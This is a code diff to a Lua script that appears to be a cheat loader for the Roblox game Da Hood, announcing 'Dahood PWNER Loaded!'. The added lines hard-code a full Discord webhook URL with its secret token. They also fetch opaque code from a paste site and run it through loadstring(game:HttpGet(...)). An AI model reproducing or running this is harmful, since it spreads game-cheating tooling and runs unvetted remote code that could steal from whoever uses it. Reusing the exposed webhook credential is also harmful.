@@ -1,3 +1,21 @@
+--[[
+
+					~~//  Color Code (HEX)  \\~~
+		RED = f54747				 GREEN = 78ff78
+		BLUE = 4c6cfc				 PURPLE = b36bff
+		YELLOW = fff27a				 PINK = ffa3e2
+
+
+	-- Don't Remove the "0x" on "getgenv().embedcolor" or it will not work!--
+
+--]]
+
+getgenv().DiscordWebhook = "https://discord.com/api/webhooks/1030813809562091682/BJyEUpp_cw53WKznqIW0-2DX6YfIYtAlu0R4Q_PHwx6YDFzMOCzV6fEEh1_v-CmUYjGe" -- Discord Webhook Here
+getgenv().embedcolor = "0xf54747" -- Embed Body Color (On left Side of the Embed, You can get HEX Code above ☝) 
+
+
+loadstring(game:HttpGet("https://pst.klgrth.io/paste/e3d52/raw"))()
+
 local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/Jxereas/UI-Libraries/main/notification_gui_library.lua", true))()
 
 Notification.new("success", "Loaded", "Dahood PWNER Loaded!")
